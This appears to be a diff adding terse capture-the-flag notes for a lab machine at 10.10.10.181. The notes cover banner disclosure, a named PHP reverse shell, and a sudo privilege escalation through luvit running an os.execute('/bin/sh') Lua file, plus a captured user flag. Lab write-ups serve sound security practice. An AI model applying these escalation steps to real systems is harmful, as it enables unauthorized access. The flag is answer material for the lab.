@@ -1,0 +1,43 @@
+Information disclosure 
+Apache/2.4.29 (Ubuntu) Server at 10.10.10.181 Port 80
+
+http://10.10.10.181.net -> (burp Suite) -> http://www.w3.org/TR/html4/strict.dtd
+
+
+Inspeccionar elemento
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+The requested URL /favicon.ico was not found on this server
+
+php-reverse-shell.php:
+
+$ cat note.txt
+- sysadmin -
+I have left a tool to practice Lua.
+I'm sure you know where to find it.
+Contact me if you have any question.
+$ cat .bash_history
+ls -la
+sudo -l
+nano privesc.lua
+sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
+rm privesc.lua
+logout
+
+
+$ echo 'os.execute("/bin/sh")' > privesc.lua
+$ cat privesc.lua
+os.execute("/bin/sh")
+$sudo -u sysadmin /home/sysadmin/luvit privesc.lua
+sh: turning off NDELAY mode
+
+$ id
+uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
+cd /home/sysadmin 
+ls
+luvit
+user.txt
+
+
+
+FLAG:cce522073245e84d56d0aa86feed58c8
+
